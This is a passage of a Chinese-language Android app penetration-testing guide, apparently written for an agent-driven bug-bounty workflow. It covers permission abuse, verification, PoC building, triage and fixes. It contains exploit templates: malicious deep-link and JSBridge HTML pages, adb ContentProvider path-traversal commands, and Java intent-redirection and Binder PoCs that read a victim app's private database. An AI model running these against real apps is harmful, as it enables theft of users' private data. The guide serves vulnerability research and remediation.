- 知情同意：是否配置清晰的权限用途说明并与实际场景一致。

**核心判断标准**：申请理由与实际行为必须一致（名实相符）。若"以通信/提醒名义申请能力，实际用于营销/拉活"，按越权处理。

**高频越权场景**
- `READ_PHONE_STATE` 相关标识采集：`getImei` / `getMeid` / `getSubscriberId` / `Build.getSerial`。
- 电话能力：`CALL_PHONE` / `ANSWER_PHONE_CALLS` 与 `RoleManager` / 默认拨号角色校验是否绑定。
- 相机能力：后台调用 `CAMERA` 且未通过前台服务提供可感知提示。
- 定位/录音：权限用途说明缺失但尝试获取长期授权（如"始终允许"）。

**漏洞判定**：越权调用敏感能力 / 隐私越界采集 → **中危**

---

### 2.17 推送/通知越权（业务逻辑重点）

```bash
grep -rn "NotificationChannel\|NotificationManager\|VoipService\|setCategory\|IMPORTANCE_HIGH\|sendStickyBroadcast" \
  /tmp/jadx_out/sources/
```

- **白名单能力滥用**：后台本地通知白名单能力是否被用于营销拉活、广告召回。
- **消息分类伪造**：`NotificationChannel` 消息类别字段是否将公信消息伪装为私信消息以绕过配额。
- **VoIP 通道滥用**：高优先级通道是否在非音视频通话场景触发强提醒。
- **QPS/惩罚机制绕过**：多包名换皮、异常并发、伪造激活数据以规避限流/处罚。
- **取证关键点**：申请能力描述、实际下发内容、触发频次、用户可感知状态（前台提示/通知栏提示）。

**漏洞判定**：白名单能力滥用 / 消息分类伪造 / VoIP 通道滥用 → **中危**

---

## 三、动态验证

**验证原则**：发现漏洞后必须立即验证。**优先尝试远程利用方式**，若远程验证不成功或不适用，再尝试本地利用方式。

### 3.1 远程利用验证（优先级 1）

针对导出的 Activity（配置了 Scheme/Host）或 WebView 存在跨域/JS 漏洞：

```html
<!-- 恶意网页 PoC：发送到目标手机，浏览器打开 -->
<a href="myapp://path?param=payload">点击触发 Deep Link</a>
<script>location.href = "myapp://webview?url=file:///data/data/com.victim/databases/private.db";</script>
```

其他远程方式：检查是否可通过特定格式的短信/邮件内容触发漏洞。

### 3.2 本地利用验证（优先级 2）

```bash
# 启动导出 Activity
adb shell am start -n com.victim/.ExportedActivity --es key value --ei intKey 1

# 触发导出 Service
adb shell am startservice -n com.victim/.ExportedService

# 发送广播
adb shell am broadcast -a com.victim.ACTION --ei state 3

# 查询 ContentProvider
adb shell content query --uri content://com.victim.provider/path

# ContentProvider 路径遍历
adb shell content read --uri "content://com.victim.provider/../../../data/data/com.victim/databases/private.db"
```

- 先用 ADB 快速验证，确认漏洞后再构建 PoC APK（见 四）提升报告质量。
- **纯 ADB 验证的漏洞评级不会高于"本地"级别**。若漏洞可通过恶意 App 利用，务必补充 PoC APK 争取更高评级。

### 3.3 合规越权验证

- 记录申请能力与业务声明（权限用途说明、白名单/VoIP 申请理由）。
- 触发实际场景并取证（后台/前台状态、用户是否可感知、消息内容类型）。
- 输出双结论：`安全影响` + `平台合规风险`，避免误判为纯技术漏洞或纯运营问题。

---

## 四、PoC 开发规范

### 4.1 项目结构

```text
poc_project/
├── app/
│   ├── build.gradle              # AGP 8.2.2+
│   └── src/main/
│       ├── aidl/                 # 从受害 App 提取的 AIDL 文件
│       ├── java/com/poc/exploit/ # 漏洞触发逻辑 (MainActivity.java)
│       └── AndroidManifest.xml
├── gradle/wrapper/               # Gradle 8.6+
├── build.gradle
└── settings.gradle
```

### 4.2 Java 21 兼容配置（Kali 等高版本环境）

```properties
# gradle/wrapper/gradle-wrapper.properties
distributionUrl=https\://services.gradle.org/distributions/gradle-8.6-bin.zip

# build.gradle
android {
    compileSdk 34
    defaultConfig {
        minSdk 21
        targetSdk 34
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_21
        targetCompatibility JavaVersion.VERSION_21
    }
}
```

> 若 Gradle 未自动识别 SDK，在 `local.properties` 中手动指定：`sdk.dir=/path/to/android-sdk`；AGP 8.0+ 需在 `gradle.properties` 加 `android.useAndroidX=true`。

### 4.3 常见 PoC 模板

**Intent 重定向 PoC**

```java
// MainActivity.java
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent malicious = new Intent();
        malicious.setComponent(new ComponentName(
            "com.victim",
            "com.victim.PrivateActivity"
        ));
        malicious.putExtra("sensitive_data", "stolen");

        Intent wrapper = new Intent();
        wrapper.setComponent(new ComponentName(
            "com.victim",
            "com.victim.ExportedActivity"
        ));
        wrapper.putExtra("redirect_intent", malicious);

        startActivity(wrapper);
    }
}
```

**Binder 服务调用 PoC**

```java
// 从受害 App 提取 AIDL 文件到 app/src/main/aidl/
public class MainActivity extends Activity {
    private ICustomService mService;

    private ServiceConnection mConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mService = ICustomService.Stub.asInterface(service);
            try {
                String result = mService.getSensitiveData();
                Log.d("PoC", "Result: " + result);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            mService = null;
        }
    };

    @Override
    protected void onStart() {
        super.onStart();
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
            "com.victim",
            "com.victim.ExportedService"
        ));
        bindService(intent, mConnection, BIND_AUTO_CREATE);
    }
}
```

**WebView JSBridge 注入 PoC**

```html
<!-- malicious.html -->
<script>
function exploit() {
    // 调用存在漏洞的 JSBridge 方法
    window.jsInterface.readFile("/data/data/com.victim/databases/private.db");
}

// 或通过自定义 scheme
location.href = "jsbridge://readFile?path=/data/data/com.victim/databases/private.db";
</script>
<button onclick="exploit()">Exploit</button>
```

---

## 五、忽略清单与分流规则

### 5.1 忽略清单（不收录，勿浪费时间）

**代码与数据保护类**
- ❌ 缺少证书绑定（Certificate Pinning）
- ❌ 受 TLS 保护下的 URL/request body 中敏感数据传输
- ❌ 用户数据未经加密存储于外部存储设备中（带有敏感信息的 APP 日志以及已承诺加密存储的用户数据除外）
- ❌ APP 缺少代码混淆保护
- ❌ APK 可被重打包
- ❌ APK 中含硬编码或可恢复的密钥
- ❌ 受到 APP 私有目录保护的敏感数据
- ❌ 安卓 APP 缺乏二进制保护控制
- ❌ APP 设置 allowBackup 为 True

**低影响 DoS**
- ❌ 向导出组件发送畸形 intents 仅导致 APP 崩溃
- ❌ 过度申请资源导致的浏览器崩溃
- ❌ 用户重启应用即可解决的本地 DoS
- ❌ 暂时性 Framework 重启

**其他类**
- ❌ App 在获取相应权限后，获取权限所允许范围内的数据
- ❌ 使用 Frida / Appmon 等工具进行的运行时黑客攻击（仅在越狱/root 环境中才可能）
- ❌ 具有较低欺骗性的钓鱼攻击
- ❌ 报告过于简单，无法根据报告复现
- ❌ 利用条件极苛刻、攻击成本较高、影响/危害较小

**关键判断**：如果漏洞的"利用"依赖 Root/Frida，或效果仅是 App 崩溃可重启，直接标记为忽略。

### 5.2 分流规则

**优先报告**（高价值漏洞）
1. ✅ 远程可达的漏洞（无需安装 PoC App）
2. ✅ 可获取 ROOT 权限或 system 权限的漏洞
3. ✅ 可读取沙箱任意文件的漏洞
4. ✅ 可执行任意代码的漏洞
5. ✅ 系统级 App 的漏洞（安全中心、设置、权限管理器等）

**次要报告**（中低价值漏洞）
1. ⚠️ 需要用户交互的漏洞（点击链接、授权等）
2. ⚠️ 仅影响特定机型或版本的漏洞
3. ⚠️ 本地可达但危害有限的漏洞

**不报告**：见 4.1 忽略清单。

### 5.3 合规越权分流（非忽略但不直接按高危计分）

以下问题**不要直接忽略**，也**不要直接按高危技术漏洞计分**，进入"合规越权"分流：
- 权限申请理由与实际用途不一致（名实不符）。
- 推送通道分类伪造、白名单能力滥用、VoIP 通道误用。
- 仅体现策略/运营违规但暂未证明可利用技术危害。

**分流输出模板（必填）**
- 安全影响：是否存在可复现的越权调用、隐私越界、敏感功能误触发。
- 合规风险：违反的策略点、触发条件、影响面、平台处置风险（限流/封禁/回收权限）。

---

## 六、验证要点

- **🔴 密钥追踪链（最高优先级，见 一）**：提取密钥（DEX grep / SO Hook / H5 提取）→ 还原签名/加密逻辑（Python 重写）→ 未授权请求成功返回真实数据 = 直接成洞
- 每个导出组件（Activity/Service/Receiver/Provider）都要回答：能否被外部触发（exported？有权限保护？有来源校验？）→ 参数可控 → 流向敏感操作（startActivity/exec/文件/数据库/UI 渲染）。
- **远程优先**：能通过 Deep Link/恶意网页触发的漏洞，评级高于 ADB 触发；验证时优先构造 HTML PoC。
- **字符串匹配 ≠ 证明执行**：grep 命中后必须沿调用链确认参数可达性与校验缺失，并截图取证。
- 组件间组合：Deep Link → WebView → JSBridge → 命令执行/文件读取 是多技能组合链（见 AGENTS.md 4.4），不要停在单点。
- 报告评级与成稿：漏洞定级与正式 DOCX 报告由 `report` 技能的分层验证门把关，本技能负责把证据链做扎实（截图、调用链、A/B 交叉证明）。
- 小程序目标见 `miniprogram-security`；so 层深度逆向（IDA/Ghidra）不在本技能范围，可另行处理。

## 七、通用修复建议

- 组件最小暴露：无外部需求一律 `android:exported="false"`；导出的组件加自定义权限保护 `android:permission`（signature 级）。
- 敏感操作组件：校验 `callingPackage` / `getCallingUid()` 白名单，Intent extras 严格白名单化。
- Intent 安全：`PendingIntent` 一律 `FLAG_IMMUTABLE`；隐式 Intent 必须 `setPackage()`；`Intent.parseUri` 加 `URI_INTENT_SCHEME` 且校验目标组件。
- WebView：关闭 file 访问（`setAllowFileAccess` 等）、JS 接口最小暴露并校验参数、`shouldOverrideUrlLoading`/JSBridge 方法白名单、生产环境关闭调试。
- Provider：`openFile`/`query` 校验 URI 与 selection，禁止拼接；FileProvider `file_paths.xml` 最小暴露；解压路径防 `../`（Zip Slip）。
- Binder/AIDL：每个方法入口强制 `checkCallingPermission()` / `checkCallingUid()`。
- 命令执行：禁止外部输入进 `Runtime.exec`/`ProcessBuilder`/`su -c`，用白名单/参数化替代。
- 数据安全：敏感数据用 Keystore/加密存储，禁用 `MODE_WORLD_READABLE/WRITEABLE`，禁止 SD 卡明文写入，日志脱敏。
- 证书校验：严格 TrustManager/HostnameVerifier，证书固定 + `network_security_config.xml`，native 层网络请求同样校验。
- 越权合规：权限申请名实相符，敏感能力（相机/定位/录音/电话）与前台可感知服务绑定。
